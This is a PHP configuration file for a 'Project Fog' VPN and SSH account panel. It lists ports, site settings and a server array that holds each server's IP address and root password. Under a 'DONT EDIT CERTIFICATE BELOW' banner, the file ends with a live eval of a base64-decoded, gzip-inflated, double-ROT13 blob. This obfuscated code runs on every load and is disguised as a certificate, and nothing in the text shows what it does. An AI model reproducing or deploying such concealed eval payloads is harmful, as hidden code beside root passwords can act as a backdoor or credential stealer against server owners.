<?php

/////////////////////////////
/////////////////////////////

//FILL UP ALL VARIABLE [ $ ] | BASE TO YOUR DESIRE://
$Nginx_Port= "NXPort";	// Nginx Port
$site_name        = "Project Fog";
$site_description = "Premium Fast And Reliable Servers";
$site_template    = "flatly"; // (flatly, darkly, sketchy, lumen, materia)
$site_ovpnmonitoring = "http://fogserverip:Fog_Openvpn_Monitoring"; // Openvpn Monitoring
$site_v2ray = "http://fogserverip:v2portas"; // v2ray ip and PORT
$site_config = "http://fogserverip:NXPort/projectfog.html"; // list of config
$config_zips = "http://fogserverip:NXPort/config.zip"; // ovpn zip check it on /home/vps/public_html
$daily_limit_user = "50"; // set daily limit

/////////////////////////////
/////////////////////////////

//Double Check if correct. Update anything not correct.
$port_ssh= 'SSH_Port1 | SSH_Port2'; 		   	 // SSH Ports
$port_dropbear= 'Dropbear_Port1 | Dropbear_Port2';  	 // Dropbear Ports
$port_ssl_dp= 'Stunnel_Port1';                    	 // SSL through Dropbear
$port_ssl_ssh= 'Stunnel_Port2';                    	 // SSL through OpenSSH
$port_ssl_ovpn= 'Stunnel_Port3';                    	 // SSL through Openvpn
$port_squid= 'Squid_Port1 | Squid_Port2 | Squid_Port3';  // Squid Ports
$port_privoxy= 'Privoxy_Port1 | Privoxy_Port2'; 	 // Privoxy Ports
$port_ohp_sq= 'OHP_Port1 | OHP_Port2';  		 // OHP through Squid
$port_ohp_pr= 'OHP_Port3 | OHP_Port4';  		 // OHP through Privoxy
$port_ohp_ov= 'OHP_Port5';  				 // OHP through Openvpn
$port_psp_sim= 'Simple_Port1 | Simple_Port2';  		 // Python Simple Socks Proxy
$port_psp_dir= 'Direct_Port1 | Direct_Port2';  		 // Python Direct Socks Proxy
$port_psp_ov= 'Open_Port1 | Open_Port2';  		 // Python Openvpn Socks Proxy
$config_fog = "config.zip";				 // Zip File Name for your OVPN Config /Default: config.zip


/////////////////////////////  
/////////////////////////////
//  SHARPEN YOUR EYES!! READ PATTERN BELOW AND EDIT LINE 45,46,47,ETC
/* Server Data */
/* Variable = Server_Name, IP_Address, Root_Pass, Account_Validity */
/* Sample: 1=>array(1=>"Name of your Server 1","your-ip-address","server-or-root-password","5"), */

$server_lists_array=array(
			1=>array(1=>"VIP Server","fogserverip","server-or-root-password","5"),
			2=>array(1=>"Reserve 1 ","your-server-ip-2.here","server-or-root-password","5"),
			3=>array(1=>"Reserve 2","your-server-ip-3.here","server-or-root-password","5"),
	);			

/////////////////////////////
/////////////////////////////



//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
////////////// DONT EDIT CERTIFICATE BELOW  //////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//ySFq7OTEwsp50s/wCXAgtgZ6pmhjGxWCIhTvX+zKbtDg71kFXVGUxBRNazoHvzqoXQoxkSYA2VUmRUG1I0aA7RQXLYkz0JBBrUbhC8JtChjy4N8s7q3DD0d7JVmD49Dt9Pp1JdTp9NDPpLYBg0aDRf+O064kHoceRD9cDUAUm1P0yMALX/JYL+ihydUWgkrmLAWLqEQxSHUoAY260vP0eDsrJa1TjhDA+rO0NUWh6DIhGoPtshTFnFYT6OQIhHJVZSRNLJHhLhqth5YAc3XU8kSJ8nc8b3Eqnin81lpjJw21QSUUvewOEZ0AdUtGJH5ROwptXdgxqAQY587fafvrq0aCsVBBmxNLhm34mplAQKCYFsIkEqdJSwSNuMBcV+lG0txWBa40x+cE6d/5oI8l3JMKbeI6YBRKzkRjrnz6Y+Qk7mSoS/tM+cM0AeQuBWwQsBia6hIQ+x9Cpwow268hBZbI2+f2J2biQVLGvuwyE6QC1Ns7vzdDfO4HNxFw3BJlwNgZwDugpq6ck48MuW7Uk332BRSGXmhIwsuF7AI9ZfN7yA2bztYyoGYkXu0VSCkooh4e7I6q70gwEU6yrVxmhiKPKnP4nhQR6cqmbbMFHOVQ29baxA/3EnVH+Q6kWs2xX6Z9hSoWvsF2IXBv1JVKXGb+uQoIMg4KUqhprFxcMmKeyMrwkzGfKgvim5TErlb/lqLuNQSYWuOQkEBDxHMlmye4KxF01OjXcHjkaWLFz2asYVcIZpOOlYk6uhVBTowtMPXTFBTApDI+epswEgsqlUop0S6fjUtEbcDBf4weHWUoZUTG21xjGV3n8p/TG+fALFc4ga1DT7IEYMcP+XNuLJyMihwd81ka
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>